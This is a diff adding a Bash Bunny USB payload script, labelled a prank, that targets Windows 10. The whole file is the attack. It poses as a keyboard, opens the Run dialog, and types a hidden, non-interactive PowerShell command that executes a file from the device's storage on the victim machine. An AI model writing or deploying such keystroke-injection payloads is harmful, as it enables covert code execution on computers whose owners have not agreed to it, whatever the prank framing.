@@ -1,0 +1,34 @@
+#!/bin/bash
+#
+# Title:         ASCii Art Prank
+# Author:        Panz05
+# Props:         Hak5Darren, RalphyZ, Dbum
+# Version:       1.0
+# Category:      Prank
+# Target:        Windows 10
+#
+# ASCii Art Prank For Windows
+
+
+# Magenta solid
+LED SETUP
+
+# Set Attack Mode
+ATTACKMODE HID STORAGE
+
+# Get Switch Position
+GET SWITCH_POSITION
+
+# Start Attack
+LED ATTACK
+
+# Run Powershell To Call File
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell -NoP -NonI -W Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\\art.txt') -e cmd.exe"
+QUACK ENTER
+
+
+# Finish Attack
+LED FINISH
+exit 0
